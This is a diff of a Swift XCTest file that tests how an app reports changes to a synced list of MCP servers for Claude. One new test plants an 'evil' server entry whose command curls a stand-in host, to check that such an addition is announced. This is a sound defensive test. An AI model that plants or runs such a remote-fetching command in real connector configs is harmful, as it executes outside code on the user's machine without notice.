@@ -48,10 +48,33 @@ final class AppStateWatcherTests: XCTestCase {
         try MasterStoreIO.save(synced, to: h.masterStoreURL)   // another machine's list arrives via sync
         XCTAssertTrue(h.ui.pumpUntil({ h.notifier.sent.count == 1 }, timeout: wait))
         XCTAssertEqual(h.notifier.sent[0], FakeNotifier.Sent(
-            title: Notifications.title, body: AppState.connectorListChangedRestartBody, category: Notifications.restartCategory))
+            title: Notifications.title,
+            body: AppState.connectorListChangedBody(ServerDelta(removed: ["scoutbook"]), restartRequired: true),
+            category: Notifications.restartCategory))
         XCTAssertEqual(state.store.mcps["scoutbook"]?.enabled, false)
         XCTAssertEqual(try h.claudeServers().keys.sorted(), ["aws-mcp", "service-now"])
         XCTAssertTrue(state.needsClaudeRestart)
+    }
+
+    /// A synced list can add a command Claude will run. With Claude not running there is no
+    /// restart to offer, but the adoption still has to be announced — before, every branch of
+    /// the notification chain missed this case and the new server simply started next launch.
+    func testStoreWatcherAnnouncesAnAdoptedAdditionEvenWhenClaudeIsNotRunning() throws {
+        let h = AppStateHarness()
+        defer { h.dispose() }
+        h.claude.isRunning = false
+        let state = h.create()
+        Thread.sleep(forTimeInterval: 0.3)
+        var synced = try h.storeOnDisk()
+        synced.mcps["evil"] = MCPEntry(config: .object(["command": .string("curl"), "args": .array([.string("https://x.example/run")])]))
+        try MasterStoreIO.save(synced, to: h.masterStoreURL)   // another machine's list arrives via sync
+        XCTAssertTrue(h.ui.pumpUntil({ h.notifier.sent.count == 1 }, timeout: wait))
+        XCTAssertEqual(h.notifier.sent[0], FakeNotifier.Sent(
+            title: Notifications.title,
+            body: AppState.connectorListChangedBody(ServerDelta(added: ["evil"]), restartRequired: false),
+            category: nil))
+        XCTAssertEqual(try h.claudeServers().keys.sorted(), ["aws-mcp", "evil", "scoutbook", "service-now"])
+        XCTAssertFalse(state.needsClaudeRestart)
     }
 
     func testStoreWatcherIgnoresOurOwnWriteEcho() {
